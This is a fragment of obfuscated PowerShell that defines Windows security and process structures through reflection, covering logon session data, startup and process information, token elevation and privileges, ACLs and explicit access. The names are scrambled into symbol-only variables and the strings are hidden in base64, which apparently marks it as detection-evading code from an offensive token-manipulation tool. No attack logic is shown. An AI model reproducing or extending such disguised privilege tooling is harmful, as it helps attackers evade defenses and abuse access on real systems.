	${/=\____/=\_/\_/\/} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEMAVQBSAEkAVABZAF8ATABPAEcATwBOAF8AUwBFAFMAUwBJAE8ATgBfAEQAQQBUAEEA'))), ${_____/==\/\_/=\/\}, [System.ValueType])
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAEkARAA='))), ${/==\____/=\__/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAEQAbwBtAGEAaQBuAA=='))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFAAYQBjAGsAYQBnAGUA'))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAFQAeQBwAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAFQAaQBtAGUA'))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAaQBuAFMAZQByAHYAZQByAA=='))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABuAHMARABvAG0AYQBpAG4ATgBhAG0AZQA='))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAG4A'))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBGAGwAYQBnAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4ASQBuAGYAbwA='))), ${/=\____/=\_/\_/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAFMAYwByAGkAcAB0AA=='))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AZgBpAGwAZQBQAGEAdABoAA=='))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAG0AZQBEAGkAcgBlAGMAdABvAHIAeQA='))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAG0AZQBEAGkAcgBlAGMAdABvAHIAeQBEAHIAaQB2AGUA'))), ${___/\___/\/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYAVABpAG0AZQA='))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAGMAawBPAGYAZgBUAGkAbQBlAA=='))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEwAYQBzAHQAUwBlAHQA'))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAEMAYQBuAEMAaABhAG4AZwBlAA=='))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAE0AdQBzAHQAQwBoAGEAbgBnAGUA'))), ${_/\_/\/====\/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${___/==\__/\_/=\/\} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEAUgBUAFUAUABJAE4ARgBPAA=='))), ${_____/==\/\_/=\/\}, [System.ValueType])
	${/===\__/\_/\/==\/}.DefineField('cb', [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFIAZQBzAGUAcgB2AGUAZAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAEQAZQBzAGsAdABvAHAA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFQAaQB0AGwAZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgAUwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkAUwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFgAQwBvAHUAbgB0AEMAaABhAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFkAQwBvAHUAbgB0AEMAaABhAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AEYAaQBsAGwAQQB0AHQAcgBpAGIAdQB0AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AEYAbABhAGcAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBTAGgAbwB3AFcAaQBuAGQAbwB3AA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBiAFIAZQBzAGUAcgB2AGUAZAAyAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABwAFIAZQBzAGUAcgB2AGUAZAAyAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABJAG4AcAB1AHQA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABPAHUAdABwAHUAdAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABTAHQAZABFAHIAcgBvAHIA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${__/\/=\/=\__/\/\_} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAE8AQwBFAFMAUwBfAEkATgBGAE8AUgBNAEEAVABJAE8ATgA='))), ${_____/==\/\_/=\/\}, [System.ValueType])
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABQAHIAbwBjAGUAcwBzAA=='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aABUAGgAcgBlAGEAZAA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFAAcgBvAGMAZQBzAHMASQBkAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZAB3AFQAaAByAGUAYQBkAEkAZAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/===\/\_______/==} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
	${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8ARQBMAEUAVgBBAFQASQBPAE4A'))), ${_____/==\/\_/=\/\}, [System.ValueType])
	${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEkAcwBFAGwAZQB2AGEAdABlAGQA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
	${/=\/==\__/\_/=\/=} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${_____/==\/\_/=\/\}, [System.ValueType], 12)
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${/==\____/=\__/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${___/==\_/=\_/====} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${_____/==\/\_/=\/\}, [System.ValueType], 16)
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${___/==\_/=\_/====}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\___/\/===\/=} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEUAXwBIAEUAQQBEAEUAUgA='))), ${_____/==\/\_/=\/\}, [System.ValueType])
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAVAB5AHAAZQA='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUARgBsAGEAZwBzAA=='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAUwBpAHoAZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/==\/==\__/\___/\} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEwA'))), ${_____/==\/\_/=\/\}, [System.ValueType])
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGwAUgBlAHYAaQBzAGkAbwBuAA=='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBiAHoAMQA='))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGwAUwBpAHoAZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGUAQwBvAHUAbgB0AA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBiAHoAMgA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${_/===\__/\_/\/\/\} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMARQBTAFMAXwBBAEwATABPAFcARQBEAF8AQQBDAEUA'))), ${_____/==\/\_/=\/\}, [System.ValueType])
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABlAGEAZABlAHIA'))), ${/==\/==\__/\___/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHMAawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAUwB0AGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${__/\/=\__/\__/=\_} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARQA='))), ${_____/==\/\_/=\/\}, [System.ValueType])
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABNAHUAbAB0AGkAcABsAGUAVAByAHUAcwB0AGUAZQA='))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AGwAdABpAHAAbABlAFQAcgB1AHMAdABlAGUATwBwAGUAcgBhAHQAaQBvAG4A'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQBGAG8AcgBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZQBUAHkAcABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB0AHMAdAByAE4AYQBtAGUA'))), [IntPtr], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${__/\/\/\__/=\__/\} = ${/===\__/\_/\/==\/}.CreateType()
    ${_____/==\/\_/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${/===\__/\_/\/==\/} = ${_/=\/\__/\___/==\}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAFAATABJAEMASQBUAF8AQQBDAEMARQBTAFMA'))), ${_____/==\/\_/=\/\}, [System.ValueType])
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYAQQBjAGMAZQBzAHMAUABlAHIAbQBpAHMAcwBpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
    ${/===\__/\_/\/==\/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGYAQQBjAGMAZQBzAHMATQBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
